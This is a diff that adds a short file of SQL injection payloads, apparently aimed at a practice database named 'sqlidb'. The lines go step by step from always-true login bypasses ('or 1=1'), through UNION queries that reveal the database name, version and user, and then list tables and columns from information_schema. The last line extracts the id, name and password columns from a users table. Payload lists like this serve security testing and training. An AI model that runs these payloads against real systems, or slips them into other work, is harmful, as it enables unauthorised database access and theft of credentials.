@@ -1,0 +1,8 @@
+-1') or 1=1#
+-1') or 1=1-- 
+-1') or ('1')=('1
+-1') union select 1,2,3#
+-1') union select database(),version(),user()#
+-1') union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='sqlidb'#
+-1') union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users' and table_schema='sqlidb'#
+-1') union select group_concat(id),group_concat(name),group_concat(pass) from users#
